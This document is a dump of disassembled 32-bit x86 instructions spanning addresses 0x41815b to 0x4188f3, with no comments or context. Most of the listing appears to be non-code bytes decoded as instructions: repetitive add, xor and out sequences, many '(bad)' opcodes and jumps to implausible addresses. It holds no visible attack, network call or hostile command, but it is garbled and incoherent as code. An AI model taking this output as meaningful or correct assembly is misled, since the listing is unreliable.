  41815b:	add    BYTE PTR [eax+0x8],dl
  41815e:	add    cl,BYTE PTR [eax]
  418160:	add    BYTE PTR [eax],bl
  418162:	push   cs
  418163:	add    BYTE PTR [eax],cl
  418165:	sbb    BYTE PTR [eax],cl
  418167:	add    BYTE PTR [eax],al
  418169:	and    BYTE PTR [esi],cl
  41816b:	add    al,BYTE PTR [eax]
  41816d:	or     BYTE PTR [esi],cl
  41816f:	add    BYTE PTR [eax],cl
  418171:	adc    BYTE PTR [eax],cl
  418173:	add    al,BYTE PTR [eax]
  418175:	add    BYTE PTR [eax],cl
  418177:	add    BYTE PTR [eax],cl
  418179:	add    BYTE PTR [eax],cl
  41817b:	add    BYTE PTR [eax],cl
  41817d:	or     BYTE PTR [eax],cl
  41817f:	add    al,BYTE PTR [eax]
  418181:	ror    BYTE PTR ds:0x7e00802,1
  418187:	add    al,BYTE PTR [eax]
  418189:	enter  0x207,0x8
  41818d:	ror    BYTE PTR ds:0x7d80000,1
  418193:	add    BYTE PTR [eax],cl
  418195:	rol    BYTE PTR [edi],0x0
  418198:	add    al,cl
  41819a:	or     eax,0x32310802
  41819f:	add    eax,DWORD PTR [eax]
  4181a1:	xor    DWORD PTR [edx],esi
  4181a3:	add    eax,DWORD PTR [edx]
  4181a5:	xor    DWORD PTR [edx],esi
  4181a7:	add    DWORD PTR [edx],eax
  4181a9:	sub    DWORD PTR [edx],edi
  4181ab:	add    DWORD PTR [edx],eax
  4181ad:	sub    DWORD PTR [edx],ebp
  4181af:	add    eax,DWORD PTR [edx]
  4181b1:	xor    DWORD PTR [edx],ebp
  4181b3:	add    eax,DWORD PTR [eax]
  4181b5:	cmp    DWORD PTR [edx],esi
  4181b7:	add    eax,DWORD PTR [edx]
  4181b9:	xor    DWORD PTR [edx],esi
  4181bb:	add    DWORD PTR [edx],eax
  4181bd:	xor    DWORD PTR [edx],ebp
  4181bf:	add    eax,DWORD PTR [eax]
  4181c1:	cmp    DWORD PTR [edx],ebp
  4181c3:	add    DWORD PTR [eax],eax
  4181c5:	add    BYTE PTR [ecx],dh
  4181c7:	cmp    al,BYTE PTR [ebx]
  4181c9:	add    ch,BYTE PTR [ecx]
  4181cb:	xor    al,BYTE PTR [ebx]
  4181cd:	add    BYTE PTR [ecx],dh
  4181cf:	xor    al,BYTE PTR [ecx]
  4181d1:	add    BYTE PTR [ecx],bh
  4181d3:	xor    al,BYTE PTR [ebx]
  4181d5:	add    bh,BYTE PTR [ecx]
  4181d7:	xor    al,BYTE PTR [ecx]
  4181d9:	add    BYTE PTR [ecx],ch
  4181db:	cmp    al,BYTE PTR [ecx]
  4181dd:	add    dh,BYTE PTR [ecx]
  4181df:	sub    al,BYTE PTR [ebx]
  4181e1:	add    BYTE PTR [ecx],dh
  4181e3:	xor    BYTE PTR [ecx],al
  4181e5:	add    dh,BYTE PTR [ecx]
  4181e7:	xor    BYTE PTR [ebx],al
  4181e9:	add    ch,BYTE PTR [ecx]
  4181eb:	xor    BYTE PTR [ebx],al
  4181ed:	add    BYTE PTR [ecx],ch
  4181ef:	xor    BYTE PTR [ecx],al
  4181f1:	add    BYTE PTR [ecx],dh
  4181f3:	xor    BYTE PTR [ebx],al
  4181f5:	add    BYTE PTR [ecx],dh
  4181f7:	cmp    BYTE PTR [ecx],al
  4181f9:	add    dh,BYTE PTR [ecx]
  4181fb:	cmp    BYTE PTR [ebx],al
  4181fd:	add    ch,BYTE PTR [ecx]
  4181ff:	xor    BYTE PTR [ebx],al
  418201:	add    BYTE PTR [ecx],bh
  418203:	sub    BYTE PTR [ecx],al
  418205:	add    BYTE PTR [ecx],bh
  418207:	xor    BYTE PTR [ebx],al
  418209:	add    BYTE PTR [ecx],dh
  41820b:	xor    BYTE PTR [ecx],al
  41820d:	add    BYTE PTR [ecx],dh
  41820f:	sub    BYTE PTR [ecx],al
  418211:	add    bh,BYTE PTR [ecx]
  418213:	sub    BYTE PTR [ebx],al
  418215:	add    BYTE PTR [ecx],bh
  418217:	or     edi,esp
  418219:	add    esi,DWORD PTR [ebx]
  41821b:	or     edi,esp
  41821d:	add    esi,DWORD PTR [ecx]
  41821f:	adc    edi,ebx
  418221:	add    eax,0x3df1133
  418226:	xor    DWORD PTR [ecx],ecx
  418228:	out    dx,eax
  418229:	add    eax,0xe7093300
  41822e:	add    eax,0x3df0933
  418233:	xor    DWORD PTR [ecx],edx
  418235:	out    0x3,eax
  418237:	xor    edx,DWORD PTR [ecx]
  418239:	out    dx,eax
  41823a:	add    eax,0x5ef1131
  41823f:	xor    DWORD PTR [ecx],ecx
  418241:	out    0x3,eax
  418243:	xor    edx,DWORD PTR [ecx]
  418245:	fild   WORD PTR ds:0x3ef0933
  41824b:	xor    DWORD PTR [ecx],ecx
  41824d:	out    dx,eax
  41824e:	add    esi,DWORD PTR [ebx]
  418250:	adc    edi,esp
  418252:	add    eax,0x23e80933
  418257:	mov    cl,0x9
  418259:	push   0x68093123
  41825e:	and    esi,DWORD PTR [ecx]
  418260:	or     DWORD PTR [edi+0x3],esp
  418263:	xor    DWORD PTR [ecx],ecx
  418265:	and    esi,DWORD PTR [bx+di+0x6808]
  41826a:	add    esi,DWORD PTR [ecx-0x4efc17f8]
  418270:	or     al,ch
  418272:	and    esi,DWORD PTR [ecx]
  418274:	or     edi,esp
  418276:	add    esi,DWORD PTR [ecx]
  418278:	or     edi,esp
  41827a:	and    esi,DWORD PTR [ecx-0x4edc18f8]
  418280:	or     BYTE PTR [eax+0x24],ch
  418283:	mov    cl,0x8
  418285:	push   0xe7093104
  41828a:	add    esi,DWORD PTR [ecx]
  41828c:	or     DWORD PTR [edi+0x4],esp
  41828f:	add    BYTE PTR [ecx+0x32e80008],dh
  418295:	mov    DWORD PTR [eax],eax
  418297:	call   0xe9418bce
  41829c:	adc    cl,BYTE PTR [ecx]
  41829e:	add    cl,ch
  4182a0:	xor    cl,BYTE PTR [ecx-0x76ad1800]
  4182a6:	add    BYTE PTR [ecx+0x2d],ch
  4182a9:	or     DWORD PTR [eax],eax
  4182ab:	jmp    0xe8420be2
  4182b0:	push   edx
  4182b1:	or     DWORD PTR [eax],eax
  4182b3:	imul   edx,DWORD PTR [ebp+0x9],0x892d6800
  4182ba:	add    al,ch
  4182bc:	xor    cl,BYTE PTR [ecx]
  4182be:	add    BYTE PTR [ecx+0x4d],ch
  4182c1:	or     DWORD PTR [eax],eax
  4182c3:	imul   esi,DWORD PTR ds:0x12e90089,0x15690009
  4182cd:	mov    DWORD PTR [eax],eax
  4182cf:	push   0x6800890d
  4182d4:	xor    eax,0x2d690009
  4182d9:	mov    DWORD PTR [eax],eax
  4182db:	call   0xe9420c12
  4182e0:	adc    cl,BYTE PTR [ecx-0x76aa9800]
  4182e6:	add    BYTE PTR [eax+0x2d],ch
  4182e9:	or     DWORD PTR [eax],eax
  4182eb:	jmp    0xe9418c22
  4182f0:	xor    cl,BYTE PTR [ecx]
  4182f2:	add    cl,ch
  4182f4:	add    BYTE PTR [edx-0x77],dl
  4182f7:	add    BYTE PTR [ecx+0x4d],ch
  4182fa:	or     DWORD PTR [eax],eax
  4182fc:	imul   esi,DWORD PTR [edx],0x32680089
  418302:	mov    DWORD PTR [eax],eax
  418304:	call   0xe8418c3b
  418309:	adc    cl,BYTE PTR [ecx-0x13b70000]
  41830f:	(bad)  
  418310:	dec    DWORD PTR [ecx-0x14]
  418313:	(bad)  
  418314:	call   FWORD PTR [eax+0xc]
  418317:	add    BYTE PTR [eax],al
  418319:	pop    ecx
  41831a:	in     al,dx
  41831b:	jg     0x41831d
  41831d:	dec    ecx
  41831e:	or     al,0x0
  418320:	add    cl,cl
  418322:	or     al,0x0
  418324:	add    BYTE PTR [eax-0x66000014],bl
  41832a:	or     al,0x80
  41832c:	add    BYTE PTR [ecx+0x8ffffec],cl
  418332:	in     al,dx
  418333:	jg     0x418335
  418335:	sbb    DWORD PTR [eax+eax*4],ecx
  418338:	add    BYTE PTR [ecx+0x8ffffec],bl
  41833e:	in     al,dx
  41833f:	(bad)  
  418340:	dec    DWORD PTR [eax+0x5900800c]
  418346:	in     al,dx
  418347:	jg     0x418349
  418349:	fmul   DWORD PTR [ebx]
  41834b:	add    BYTE PTR [eax],al
  41834d:	dec    eax
  41834e:	or     al,0x80
  418350:	add    BYTE PTR [eax-0x14],cl
  418353:	(bad)  
  418354:	(bad)  
  418355:	fsubr  st,st(3)
  418357:	jg     0x418359
  418359:	add    BYTE PTR [eax+0x5],bl
  41835c:	add    BYTE PTR [eax],al
  41835e:	dec    eax
  41835f:	add    eax,0xc480208
  418364:	or     BYTE PTR [edx],al
  418366:	sbb    BYTE PTR ds:0xc184200,al
  41836c:	or     BYTE PTR [eax],al
  41836e:	or     BYTE PTR ds:0xc080000,al
  418374:	add    BYTE PTR [eax+0x18],al
  418377:	or     al,0x8
  418379:	add    bl,BYTE PTR [eax]
  41837b:	add    eax,0xc084008
  418380:	or     BYTE PTR [eax],al
  418382:	or     BYTE PTR [ebx],cl
  418384:	add    BYTE PTR [edx],al
  418386:	xor    DWORD PTR [edx],esi
  418388:	add    cl,BYTE PTR [eax]
  41838a:	jno    0x4183be
  41838c:	add    al,BYTE PTR [eax]
  41838e:	jae    0x4183c2
  418390:	add    DWORD PTR [eax],ecx
  418392:	jae    0x4183c6
  418394:	add    cl,BYTE PTR [eax]
  418396:	xor    DWORD PTR [edx],esi
  418398:	add    DWORD PTR [eax],eax
  41839a:	jno    0x4183ce
  41839c:	add    DWORD PTR [eax],eax
  41839e:	xor    esi,DWORD PTR [edx]
  4183a0:	add    DWORD PTR [eax],ecx
  4183a2:	jno    0x4183d6
  4183a4:	add    DWORD PTR [eax],ecx
  4183a6:	icebp  
  4183a7:	xor    DWORD PTR [ecx],eax
  4183a9:	add    BYTE PTR [ecx],dh
  4183ab:	xor    al,BYTE PTR [edx]
  4183ad:	add    cl,dh
  4183af:	xor    DWORD PTR [edx],eax
  4183b1:	or     bl,dh
  4183b3:	xor    DWORD PTR [edx],eax
  4183b5:	or     bl,dh
  4183b7:	xor    DWORD PTR [edx],eax
  4183b9:	add    BYTE PTR [ebx],dh
  4183bb:	xor    al,BYTE PTR [ecx]
  4183bd:	or     BYTE PTR [eax],al
  4183bf:	repz xor DWORD PTR [edx],eax
  4183c2:	add    cl,dh
  4183c4:	xor    DWORD PTR [ecx],eax
  4183c6:	add    BYTE PTR [ecx],dh
  4183c8:	xor    al,BYTE PTR [ecx]
  4183ca:	add    bl,dh
  4183cc:	xor    DWORD PTR [edx],eax
  4183ce:	or     BYTE PTR [ebx],dh
  4183d0:	xor    al,BYTE PTR [ecx]
  4183d2:	add    BYTE PTR [ebx],dh
  4183d4:	xor    al,BYTE PTR [ecx]
  4183d6:	add    bl,dh
  4183d8:	xor    DWORD PTR [edx],eax
  4183da:	or     BYTE PTR [ecx],dh
  4183dc:	xor    al,BYTE PTR [ecx]
  4183de:	or     BYTE PTR [ecx],dh
  4183e0:	xor    al,BYTE PTR [edx]
  4183e2:	add    bl,dh
  4183e4:	xor    DWORD PTR [edx],eax
  4183e6:	add    BYTE PTR [ecx],dh
  4183e8:	xor    BYTE PTR [ecx],al
  4183ea:	add    BYTE PTR [ebx],dh
  4183ec:	xor    BYTE PTR [ecx],al
  4183ee:	add    BYTE PTR [ecx+0x30],dh
  4183f1:	add    DWORD PTR [eax],ecx
  4183f3:	xor    esi,DWORD PTR [eax]
  4183f5:	add    al,BYTE PTR [eax]
  4183f7:	jae    0x418429
  4183f9:	add    cl,BYTE PTR [eax]
  4183fb:	jno    0x41842d
  4183fd:	add    al,BYTE PTR [eax]
  4183ff:	xor    ecx,DWORD PTR [ecx]
  418401:	out    0x3,eax
  418403:	xor    ecx,ecx
  418405:	out    0x3,al
  418407:	cmp    ebx,ecx
  418409:	out    0x2,al
  41840b:	cmp    DWORD PTR [ebx],ecx
  41840d:	out    0x2,eax
  41840f:	sub    ecx,ecx
  418411:	out    0x2,al
  418413:	xor    DWORD PTR [ecx],ecx
  418415:	out    0x3,eax
  418417:	xor    DWORD PTR [ebx],ecx
  418419:	out    0x3,eax
  41841b:	cmp    ebx,ecx
  41841d:	out    0x2,al
  41841f:	sub    ebx,ecx
  418421:	out    0x2,al
  418423:	add    BYTE PTR [ecx],ch
  418425:	or     edi,esp
  418427:	add    esi,DWORD PTR [ecx]
  418429:	retf   
  41842a:	out    0x2,al
  41842c:	cmp    ebx,ecx
  41842e:	out    0x3,al
  418430:	sub    DWORD PTR [ebx],ecx
  418432:	out    0x3,eax
  418434:	xor    DWORD PTR [ecx],ecx
  418436:	out    0x3,eax
  418438:	cmp    ecx,ecx
  41843a:	out    0x3,al
  41843c:	xor    ebx,ecx
  41843e:	out    0x2,al
  418440:	sub    DWORD PTR [ecx],ecx
  418442:	out    0x2,eax
  418444:	xor    DWORD PTR [ebx],ecx
  418446:	out    0x2,eax
  418448:	xor    ecx,ecx
  41844a:	out    0x3,al
  41844c:	cmp    DWORD PTR [ecx],ecx
  41844e:	out    0x3,eax
  418450:	xor    DWORD PTR [ecx],ecx
  418452:	out    0x3,eax
  418454:	sub    ecx,ecx
  418456:	out    0x2,al
  418458:	cmp    DWORD PTR [ebx],ecx
  41845a:	out    0x2,eax
  41845c:	xor    ecx,ecx
  41845e:	(bad)  
  41845f:	add    esi,DWORD PTR [ecx]
  418461:	jmp    0xe932884c
  418466:	out    0xc3,al
  418468:	cs ds test ebx,0x3e6e966
  418470:	jno    0x41845b
  418472:	(bad)  
  418473:	add    esi,DWORD PTR [ecx]
  418475:	or     edi,edx
  418477:	ret    
  418478:	dec    esi
  418479:	jmp    0xc9746d7d
  41847e:	(bad)  
  41847f:	call   0xf95ec276
  418484:	repnz std 
  418486:	(bad)  
  418487:	call   0xab68c
  41848c:	clc    
  41848d:	xor    cl,BYTE PTR [ecx]
  41848f:	and    cl,bh
  418491:	xor    cl,cl
  418493:	(bad)  
  418494:	call   0xe95ec28b
  418499:	xor    cl,BYTE PTR [ecx]
  41849b:	and    cl,bl
  41849d:	repnz cmp eax,0x932e9fd
  4184a3:	add    cl,bh
  4184a5:	xor    cl,cl
  4184a7:	(bad)  
  4184a8:	clc    
  4184a9:	jb     0x4184e8
  4184ab:	sbb    eax,0xfd3d72e9
  4184b0:	jmp    0xd9418227
  4184b5:	jb     0x4184f4
  4184b7:	sbb    eax,0x932d9
  4184bc:	fnstenv [edx]
  4184be:	leave  
  4184bf:	pop    ds
  4184c0:	fnstenv [edx]
  4184c2:	leave  
  4184c3:	pop    ds
  4184c4:	jmp    0xf9418dfb
  4184c9:	jb     0x4184c8
  4184cb:	(bad)  
  4184cc:	call   0xf9618243
  4184d1:	jb     0x418510
  4184d3:	std    
  4184d4:	jmp    0xe941824b
  4184d9:	jb     0x4184d8
  4184db:	pop    ds
  4184dc:	jmp    0xe9618e13
  4184e1:	jb     0x418520
  4184e3:	sbb    eax,0x932f9
  4184e8:	stc    
  4184e9:	xor    cl,cl
  4184eb:	pop    ds
  4184ec:	jmp    0x3e76f1
  4184f1:	clc    
  4184f2:	repnz cld 
  4184f4:	pop    ds
  4184f5:	add    BYTE PTR [eax],cl
  4184f7:	or     DWORD PTR [eax+0x0],eax
  4184fa:	call   0xe9418247
  4184ff:	or     BYTE PTR [eax],al
  418501:	and    BYTE PTR [eax],cl
  418503:	or     DWORD PTR [eax+0x0],eax
  418506:	or     BYTE PTR [ecx-0x3],cl
  418509:	pop    ds
  41850a:	fmul   DWORD PTR [eax]
  41850c:	add    BYTE PTR [eax],ah
  41850e:	call   0xd941825b
  418513:	or     BYTE PTR [eax],al
  418515:	and    al,bh
  418517:	dec    eax
  418518:	cmp    eax,0x3d48d820
  41851d:	add    al,bl
  41851f:	or     BYTE PTR [eax+0x20],al
  418522:	fmul   DWORD PTR [eax+0x3d]
  418525:	add    al,cl
  418527:	dec    eax
  418528:	cmp    eax,0x89820
  41852d:	add    BYTE PTR [eax-0x67dfbff8],ch
  418533:	or     BYTE PTR [eax],al
  418535:	add    BYTE PTR [eax-0x670002b8],cl
  41853b:	or     BYTE PTR [eax+0x20],al
  41853e:	push   0x88003d48
  418543:	dec    eax
  418544:	std    
  418545:	(bad)  
  418546:	js     0x418550
  418548:	inc    eax
  418549:	add    BYTE PTR [eax+0x48],ch
  41854c:	std    
  41854d:	pop    ds
  41854e:	pop    eax
  41854f:	or     BYTE PTR [eax],al
  418551:	add    BYTE PTR [eax],al
  418553:	dec    eax
  418554:	dec    eax
  418555:	cmp    eax,0x84820
  41855a:	and    BYTE PTR [eax+0x8],ch
  41855d:	inc    eax
  41855e:	add    BYTE PTR [eax+0x48],ch
  418561:	std    
  418562:	pop    ds
  418563:	dec    eax
  418564:	or     BYTE PTR [eax],ah
  418566:	add    BYTE PTR [edx+0x8],cl
  418569:	and    BYTE PTR [edx+ebx*1],al
  41856c:	inc    eax
  41856d:	std    
  41856e:	add    esi,DWORD PTR [ecx]
  418570:	xor    al,BYTE PTR [ecx]
  418572:	add    BYTE PTR [ecx],dh
  418574:	xor    bh,cl
  418576:	call   DWORD PTR [esi]
  418578:	xor    cl,bh
  41857a:	push   DWORD PTR [edx]
  41857c:	xor    cl,bh
  41857e:	pop    ds
  41857f:	xor    DWORD PTR [edx],esi
  418581:	stc    
  418582:	pop    ds
  418583:	xor    eax,0x2d1ff930
  418588:	xor    al,BYTE PTR [ecx]
  41858a:	and    BYTE PTR [ecx],dh
  41858c:	xor    al,BYTE PTR [ecx]
  41858e:	add    BYTE PTR [ecx],dh
  418590:	xor    BYTE PTR [ecx],al
  418592:	add    BYTE PTR ds:0x31000130,dh
  418598:	xor    al,BYTE PTR [ecx]
  41859a:	add    BYTE PTR ds:0x2d200130,dh
  4185a0:	xor    cl,bh
  4185a2:	(bad)  
  4185a3:	mov    esi,0x32fff931
  4185a8:	xor    cl,bh
  4185aa:	pop    ds
  4185ab:	xor    DWORD PTR [eax],esi
  4185ad:	add    DWORD PTR [eax],esp
  4185af:	xor    DWORD PTR [edx],esi
  4185b1:	stc    
  4185b2:	push   DWORD PTR [edx]
  4185b4:	xor    BYTE PTR [ecx],al
  4185b6:	add    BYTE PTR [eax],al
  4185b8:	sub    eax,0x35200132
  4185bd:	xor    bh,cl
  4185bf:	pop    ds
  4185c0:	sub    eax,0x31200130
  4185c5:	xor    al,BYTE PTR [ecx]
  4185c7:	and    BYTE PTR ds:0x6efff932,ch
  4185cd:	das    
  4185ce:	stc    
  4185cf:	jmp    DWORD PTR [esi+0x2f]
  4185d2:	stc    
  4185d3:	pop    ds
  4185d4:	xor    eax,0x311ff932
  4185d9:	xor    BYTE PTR [ecx],al
  4185db:	add    BYTE PTR [ecx],dh
  4185dd:	xor    al,BYTE PTR [ecx]
  4185df:	add    BYTE PTR ds:0x311ff932,ch
  4185e5:	xor    al,BYTE PTR [ecx]
  4185e7:	add    BYTE PTR ds:0x4efbe709,ch
  4185ed:	or     edi,esp
  4185ef:	add    edx,DWORD PTR [ecx+0x9]
  4185f2:	jmp    0xe948a4f2
  4185f7:	sti    
  4185f8:	push   ss
  4185f9:	pop    es
  4185fa:	jmp    0xe946d702
  4185ff:	add    edx,DWORD PTR [ecx+0x5]
  418602:	jmp    0xe94ab70a
  418607:	add    edx,DWORD PTR [ecx+0x9]
  41860a:	out    0x3,eax
  41860c:	xor    DWORD PTR ds:0x6e6fbe7,eax
  418612:	out    0x3,eax
  418614:	adc    DWORD PTR [ecx],ecx
  418616:	out    0xfb,eax
  418618:	ss add eax,0xce00fbe9
  41861e:	cmp    ch,cl
  418620:	sti    
  418621:	es or  edi,esp
  418624:	sti    
  418625:	push   ds
  418626:	add    eax,0x3ab6fbe9
  41862b:	jmp    0xe946b733
  418630:	sti    
  418631:	inc    esi
  418632:	add    eax,0x55103e7
  418637:	out    0xfb,eax
  418639:	ss or  edi,esp
  41863c:	add    esi,DWORD PTR [ecx]
  41863e:	or     ecx,ebp
  418640:	add    esi,DWORD PTR [ecx]
  418642:	or     ecx,ebp
  418644:	sti    
  418645:	push   ds
  418646:	add    eax,0x93103e7
  41864b:	jmp    0xe74ad54b
  418650:	add    edx,DWORD PTR [ecx]
  418652:	add    eax,0x3a5efbe7
  418657:	jmp    0xe746b75f
  41865c:	sti    
  41865d:	dec    esi
  41865e:	push   es
  41865f:	out    0xfb,eax
  418661:	inc    esi
  418662:	cmp    al,BYTE PTR [eax]
  418664:	jmp    0x418698
  418666:	jmp    0x3a842f6a
  41866b:	or     eax,0xfd3a22e9
  418670:	jmp    0xa9418ba7
  418675:	and    al,BYTE PTR [esi]
  418677:	adc    cl,ch
  418679:	xor    cl,BYTE PTR [ecx]
  41867b:	adc    BYTE PTR [ecx-0x56f2c5fe],ch
  418681:	add    BYTE PTR [edx],dh
  418683:	or     DWORD PTR [eax],eax
  418685:	jmp    0xa9518fbc
  41868a:	xor    al,BYTE PTR ds:0x532e900
  418690:	adc    BYTE PTR [ecx],ch
  418692:	fld    QWORD PTR ds:0x5e2e910
  418698:	add    cl,ch
  41869a:	loop   0x4186a1
  41869c:	adc    BYTE PTR [ecx],ch
  41869e:	lds    eax,FWORD PTR ds:0x39c2e900
  4186a4:	std    
  4186a5:	sub    DWORD PTR ds:0x32e90009,esi
  4186ab:	add    eax,0x9352910
  4186b0:	adc    cl,ch
  4186b2:	mov    ds:0xa5290d39,al
  4186b7:	cmp    ebp,edi
  4186b9:	jmp    0x29418c60
  4186be:	xor    eax,0x2d290005
  4186c3:	add    eax,0x582e910
  4186c8:	adc    BYTE PTR [ecx],ch
  4186ca:	jge    0x418705
  4186cc:	std    
  4186cd:	jmp    0xe9419004
  4186d2:	xor    cl,BYTE PTR [ecx]
  4186d4:	add    BYTE PTR [ecx-0x56efface],ch
  4186da:	xor    cl,BYTE PTR [ecx]
  4186dc:	adc    BYTE PTR [eax],al
  4186de:	pop    eax
  4186df:	xor    eax,0x35980ffd
  4186e4:	add    DWORD PTR [eax],eax
  4186e6:	add    BYTE PTR [eax+0x5],cl
  4186e9:	add    al,0x0
  4186eb:	mov    BYTE PTR ds:0xd180001,dh
  4186f1:	add    al,0x0
  4186f3:	sbb    BYTE PTR ds:0x3d081001,bh
  4186f9:	std    
  4186fa:	dec    eax
  4186fc:	or     al,0x0
  4186fe:	add    al,bl
  418700:	or     al,0x4
  418702:	adc    BYTE PTR [eax],bl
  418704:	cmp    eax,0x3cc8fffd
  418709:	add    DWORD PTR [eax],eax
  41870b:	or     BYTE PTR ds:0xd180ffd,bh
  418711:	add    BYTE PTR [eax],al
  418713:	sbb    BYTE PTR ds:0xcc81000,cl
  418719:	add    al,0x10
  41871b:	or     BYTE PTR ds:0xcd81004,cl
  418721:	add    BYTE PTR [eax],dl
  418723:	fmul   DWORD PTR [esp+eax*1]
  418726:	add    BYTE PTR [eax],cl
  418728:	cmp    eax,0xcc80ffd
  41872d:	add    BYTE PTR [eax],al
  41872f:	pop    eax
  418730:	cmp    eax,0xd581001
  418735:	add    al,0x0
  418737:	dec    eax
  418738:	or     eax,0xc881000
  41873d:	add    al,0x10
  41873f:	cwde   
  418740:	cmp    al,0xfd
  418742:	addps  xmm7,XMMWORD PTR ds:0xc880ffd
  418749:	add    BYTE PTR [eax],al
  41874b:	add    BYTE PTR [eax+0x3d],cl
  41874e:	add    DWORD PTR [eax],edx
  418750:	pop    eax
  418751:	cmp    al,0x1
  418753:	add    BYTE PTR [eax+0x3c],bl
  418756:	add    DWORD PTR [eax],eax
  418758:	xor    DWORD PTR [edx-0xf],esp
  41875b:	call   DWORD PTR [esi+0x62]
  41875e:	icebp  
  41875f:	dec    DWORD PTR [esi+0x62]
  418762:	add    DWORD PTR [ecx+esi*1],eax
  418765:	and    al,BYTE PTR [ecx]
  418767:	add    BYTE PTR [ecx],ah
  418769:	and    dh,cl
  41876b:	add    esp,DWORD PTR [ecx]
  41876d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41876e:	(bad)  
  418771:	and    al,BYTE PTR [ecx]
  418773:	add    BYTE PTR [ecx],dh
  418775:	and    al,BYTE PTR [ecx]
  418777:	add    BYTE PTR [ecx],dh
  418779:	xchg   esi,eax
  41877a:	jnp    0x41877b
  41877c:	push   ss
  41877d:	xchg   esi,eax
  41877e:	test   bh,bh
  418780:	push   cs
  418781:	rol    BYTE PTR [eax+0x12206ff],cl
  418787:	add    BYTE PTR [ecx],dh
  418789:	and    al,BYTE PTR [ecx]
  41878b:	add    BYTE PTR [ecx],dh
  41878d:	inc    eax
  41878e:	jl     0x41878f
  418790:	out    dx,al
  418791:	add    DWORD PTR [edx-0x7b7a1901],eax
  418797:	(bad)  
  418798:	fisub  WORD PTR [ecx]
  41879a:	add    DWORD PTR [eax],eax
  41879c:	xor    DWORD PTR [edx],esp
  41879e:	add    DWORD PTR [eax],eax
  4187a0:	xor    DWORD PTR [esi],edi
  4187a2:	jl     0x4187a3
  4187a4:	(bad)  
  4187a5:	xor    eax,0xb5beff7f
  4187aa:	cmp    edi,0xffffffb6
  4187ad:	and    DWORD PTR [ecx],eax
  4187af:	add    BYTE PTR [eax],al
  4187b1:	xor    DWORD PTR [edx],esp
  4187b3:	add    DWORD PTR [eax],eax
  4187b5:	xor    DWORD PTR [edx+0x7b],esi
  4187b8:	call   FWORD PTR [esi-0x69007e1b]
  4187be:	lea    eax,[edi+edi*8+0x1218e]
  4187c5:	xor    DWORD PTR [edx],esp
  4187c7:	add    DWORD PTR [eax],eax
  4187c9:	xor    DWORD PTR [eax+0x3d76ff7b],edx
  4187cf:	jg     0x4187d0
  4187d1:	outs   dx,BYTE PTR ds:[esi]
  4187d2:	or     BYTE PTR [ebx-0x7c],dl
  4187d5:	data16 aaa 
  4187d7:	out    0x3,eax
  4187d9:	xor    DWORD PTR [ecx],ecx
  4187db:	out    0x3,eax
  4187dd:	xor    DWORD PTR [ecx],ecx
  4187df:	add    edi,DWORD PTR [esi+ecx*2+0x37]
  4187e3:	ret    
  4187e4:	add    DWORD PTR [esi+0x37],0x373e843f
  4187eb:	out    0x3,eax
  4187ed:	xor    DWORD PTR [ecx],ecx
  4187ef:	out    0x3,eax
  4187f1:	xor    DWORD PTR [ecx],ecx
  4187f3:	popf   
  4187f4:	jnp    0x41881c
  4187f6:	aaa    
  4187f7:	outs   dx,DWORD PTR ds:[esi]
  4187f8:	sbb    BYTE PTR [esi],0x37
  4187fb:	sti    
  4187fc:	adc    BYTE PTR [esi],0x37
  4187ff:	out    0x3,eax
  418801:	xor    DWORD PTR [ecx],ecx
  418803:	out    0x3,eax
  418805:	xor    DWORD PTR [ecx],ecx
  418807:	cmc    
  418808:	jnp    0x418808
  41880a:	ss dec ebx
  41880c:	xor    dh,0x36
  41880f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418810:	sub    dh,0x36
  418813:	out    0x3,eax
  418815:	add    BYTE PTR [ecx],dh
  418817:	or     edi,esp
  418819:	add    esi,DWORD PTR [ecx]
  41881b:	or     DWORD PTR [ecx],eax
  41881d:	jnp    0x4187f5
  41881f:	ss mov bh,0x81
  418822:	into   
  418823:	ss out 0x3,eax
  418826:	xor    DWORD PTR [ecx],ecx
  418828:	out    0x3,eax
  41882a:	xor    DWORD PTR [ecx],ecx
  41882c:	out    0x3,eax
  41882e:	xor    DWORD PTR [ecx],ecx
  418830:	out    0x3,eax
  418832:	xor    DWORD PTR [ecx],ecx
  418834:	out    0x3,eax
  418836:	xor    DWORD PTR [ecx],ecx
  418838:	mov    ebx,0x81369e81
  41883d:	adc    DWORD PTR [esi-0x717e6aca],0x8680eb36
  418847:	xlat   BYTE PTR ss:[ebx]
  418849:	cmp    BYTE PTR [esi+0x36],0x0
  41884d:	aad    0xb1
  41884f:	ss std 
  418851:	ret    
  418852:	mov    cl,0x36
  418854:	std    
  418855:	and    esi,DWORD PTR [eax-0x4e5802ca]
  41885b:	ss std 
  41885d:	mov    ebp,0xc9fd36b1
  418862:	mov    cl,0x36
  418864:	std    
  418865:	aad    0xb1
  418867:	ss std 
  418869:	imul   esi,DWORD PTR [ecx-0x4ea802ca],0x36
  418870:	std    
  418871:	jge    0x418824
  418873:	xor    eax,0x35b12bfd
  418878:	std    
  418879:	cmp    eax,DWORD PTR [eax]
  41887b:	mov    cl,0x35
  41887d:	std    
  41887e:	or     eax,0x15fd35b1
  418883:	mov    cl,0x35
  418885:	std    
  418886:	out    dx,eax
  418887:	xchg   BYTE PTR [esi],dh
  418889:	std    
  41888a:	xlat   BYTE PTR ds:[ebx]
  41888b:	jle    0x4188c3
  41888d:	std    
  41888e:	ret    
  41888f:	jbe    0x4188c7
  418891:	std    
  418892:	mov    cl,0x6e
  418894:	ss std 
  418896:	xor    eax,0x4bfd35b9
  41889b:	test   eax,0xa95bfd35
  4188a0:	xor    eax,0x35b94ffd
  4188a5:	std    
  4188a6:	arpl   WORD PTR [ecx-0x567202cb],di
  4188ac:	xor    eax,0x35a973fd
  4188b1:	std    
  4188b2:	mov    ds:0xc5fd35b9,eax
  4188b7:	mov    ecx,0xa991fd35
  4188bc:	xor    eax,0x35a991fd
  4188c1:	std    
  4188c2:	in     eax,0xb9
  4188c4:	xor    eax,0x809000fd
  4188c9:	std    
  4188ca:	jmp    DWORD PTR [eax-0x80]
  4188cd:	std    
  4188ce:	inc    edx
  4188d0:	cmp    ch,0xff
  4188d3:	adc    al,BYTE PTR [eax-0x7f850003]
  4188d9:	std    
  4188da:	(bad)  
  4188db:	jle    0x41885d
  4188dd:	std    
  4188de:	inc    DWORD PTR [eax]
  4188e0:	(bad)  
  4188e1:	jg     0x4188e0
  4188e3:	jmp    DWORD PTR [eax+0x28fffd7f]
  4188e9:	cmp    ch,0xff
  4188ec:	loopne 0x41896d
  4188ee:	std    
  4188ef:	push   esp
  4188f1:	jg     0x4188f0
  4188f3:	call   DWORD PTR [edx]
